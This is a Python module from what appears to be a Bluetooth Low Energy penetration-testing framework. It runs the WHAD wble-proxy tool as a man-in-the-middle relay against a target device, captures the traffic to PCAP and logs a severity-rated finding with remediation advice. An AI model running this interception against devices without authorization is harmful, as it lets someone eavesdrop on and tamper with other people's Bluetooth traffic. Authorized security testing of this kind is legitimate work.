"""
Stage 6 — MITM Proxy

Positions a transparent BLE proxy between a central and peripheral using
wble-proxy.  Two RF interfaces are required: the attack dongle (-i) and a
proxy/relay interface (-p, typically the host's built-in HCI adapter).

Prerequisite checks (all must pass before the active gate runs):
  1. wble-proxy binary in PATH
  2. target.connectable is True
  3. proxy interface accessible (hci0 or second WHAD dongle)

Mirrors Stage 5's dongle lifecycle: close WhadDevice before CLI, reopen after.
"""

from __future__ import annotations

import os
import shutil
import subprocess

from whad.device import WhadDevice

from core.dongle import WhadDongle
from core.models import Target, Finding
from core.db import insert_finding
from core.logger import get_logger
from core.pcap import pcap_path
import config

log = get_logger("s6_proxy")

PROXY_TIMEOUT = 300   # seconds the proxy runs before auto-stop


def run(dongle: WhadDongle, target: Target, engagement_id: str) -> None:
    """Run the MITM proxy stage against a single target.

    Args:
        dongle: Active WhadDongle (closed for CLI, reopened in finally).
        target: Connectable target to proxy.
        engagement_id: Engagement ID for PCAP naming and Finding storage.
    """
    if not _prereqs_ok(target):
        return

    addr = target.bd_address
    rand_flag = "-r" if target.address_type != "public" else ""
    _pcap = pcap_path(engagement_id, 6, addr)

    cmd = (
        f"wble-proxy"
        f" -i {config.INTERFACE}"
        f" -p {config.PROXY_INTERFACE}"
        f" {rand_flag}"
        f" --output {_pcap}"
        f" {addr}"
    )

    log.info(f"[S6] Starting MITM proxy against {addr}")
    log.info(f"[S6] Attack interface : {config.INTERFACE}")
    log.info(f"[S6] Proxy interface  : {config.PROXY_INTERFACE}")
    log.info(f"[S6] PCAP output      : {_pcap}")
    log.debug(f"[S6] Command: {cmd}")

    dongle.device.close()

    stdout = ""
    stderr = ""
    returncode = -1

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=PROXY_TIMEOUT,
        )
        stdout = result.stdout
        stderr = result.stderr
        returncode = result.returncode
    except subprocess.TimeoutExpired:
        log.info(f"[S6] Proxy session ended after {PROXY_TIMEOUT}s timeout.")
    except Exception as exc:
        log.error(f"[S6] Subprocess error: {type(exc).__name__}: {exc}")
    finally:
        _reopen_dongle(dongle)

    if stderr.strip():
        log.debug(f"[S6] wble-proxy stderr: {stderr.strip()[:240]}")

    data_intercepted, connections_accepted = _parse_proxy_output(stdout)

    log.info(
        f"[S6] Proxy complete: "
        f"connections_accepted={connections_accepted}  "
        f"data_intercepted={data_intercepted}  "
        f"exit={returncode}"
    )

    _record_finding(
        target=target,
        engagement_id=engagement_id,
        pcap_path_str=str(_pcap),
        data_intercepted=data_intercepted,
        connections_accepted=connections_accepted,
    )
    _print_summary(target, data_intercepted, connections_accepted, str(_pcap))


def _prereqs_ok(target: Target) -> bool:
    """Check all prerequisites. Logs a descriptive error and returns False on failure."""
    if not shutil.which("wble-proxy"):
        log.error(
            "[S6] wble-proxy not found in PATH. "
            "Install WHAD tools: pip install whad"
        )
        return False

    if not target.connectable:
        log.error(
            f"[S6] Target {target.bd_address} is not connectable — "
            "MITM proxy requires a connectable peripheral."
        )
        return False

    if not _proxy_interface_accessible(config.PROXY_INTERFACE):
        log.error(
            f"[S6] Proxy interface '{config.PROXY_INTERFACE}' is not accessible. "
            f"Check with: hciconfig {config.PROXY_INTERFACE} up  "
            "Or use --proxy-interface to specify a different interface."
        )
        return False

    return True


def _proxy_interface_accessible(iface: str) -> bool:
    """Return True if the proxy interface appears usable.

    Lightweight check only — actual errors surface in the subprocess.
    Optimistic pass for unknown interface types.
    """
    if iface.startswith("hci"):
        try:
            result = subprocess.run(
                ["hciconfig", iface],
                capture_output=True,
                text=True,
                timeout=5,
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            # hciconfig not available (e.g. macOS without bluez) — optimistic pass
            return True

    if iface.startswith("uart"):
        return os.path.exists(f"/dev/{iface}")

    return True   # unknown interface type — optimistic


def _reopen_dongle(dongle: WhadDongle) -> None:
    """Re-attach the underlying WhadDevice after CLI run (mirrors s5_interact)."""
    try:
        dongle.device = WhadDevice.create(config.INTERFACE)
    except Exception as exc:
        log.warning(f"[S6] Could not reopen WHAD device: {exc}")


def _parse_proxy_output(stdout: str) -> tuple[bool, bool]:
    """Heuristically extract connection/data signals from wble-proxy stdout.

    Returns:
        (data_intercepted, connections_accepted)

    NOTE: wble-proxy output format is not fully documented. Adjust keywords
    after first live test by inspecting actual stdout with log.debug().
    """
    lo = stdout.lower()
    connections_accepted = any(
        kw in lo
        for kw in ("connection established", "connected", "accepted", "central connected")
    )
    data_intercepted = any(
        kw in lo
        for kw in ("intercepted", "forwarded", "bytes", "read request", "write request")
    )
    return data_intercepted, connections_accepted


def _record_finding(
    target: Target,
    engagement_id: str,
    pcap_path_str: str,
    data_intercepted: bool,
    connections_accepted: bool,
) -> None:
    severity = (
        "critical" if data_intercepted
        else "high" if connections_accepted
        else "medium"
    )

    finding = Finding(
        type="mitm_proxy",
        severity=severity,
        target_addr=target.bd_address,
        description=(
            f"MITM proxy positioned against {target.bd_address} "
            f"({target.name or 'unnamed'}, {target.device_class}). "
            f"Connections accepted: {connections_accepted}. "
            f"Application data intercepted: {data_intercepted}. "
            "Traffic captured to PCAP for offline analysis."
        ),
        remediation=(
            "Implement mutual authentication using LE Secure Connections "
            "with MITM protection (authenticated pairing). "
            "Verify peripheral identity via IRK or certificate. "
            "Encrypt application-layer data as defence-in-depth."
        ),
        evidence={
            "target_addr": target.bd_address,
            "target_name": target.name,
            "device_class": target.device_class,
            "attack_interface": config.INTERFACE,
            "proxy_interface": config.PROXY_INTERFACE,
            "data_intercepted": data_intercepted,
            "connections_accepted": connections_accepted,
        },
        pcap_path=pcap_path_str,
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(
        f"FINDING [{severity}] mitm_proxy: {target.bd_address} — "
        f"connections_accepted={connections_accepted}  "
        f"data_intercepted={data_intercepted}"
    )


def _print_summary(
    target: Target,
    data_intercepted: bool,
    connections_accepted: bool,
    pcap_path_str: str,
) -> None:
    severity = (
        "critical" if data_intercepted
        else "high" if connections_accepted
        else "medium"
    )
    print("\n" + "-" * 72)
    print("  STAGE 6 SUMMARY -- MITM Proxy")
    print("-" * 72)
    print(f"  Target              : {target.bd_address}")
    print(f"  Name                : {target.name or '(unnamed)'}")
    print(f"  Device class        : {target.device_class}")
    print(f"  Attack interface    : {config.INTERFACE}")
    print(f"  Proxy interface     : {config.PROXY_INTERFACE}")
    print(f"  PCAP                : {pcap_path_str}")
    print(f"  Connections accepted: {'yes' if connections_accepted else 'no'}")
    print(f"  Data intercepted    : {'yes' if data_intercepted else 'no'}")
    print(f"  Severity            : {severity.upper()}")
    print("-" * 72 + "\n")
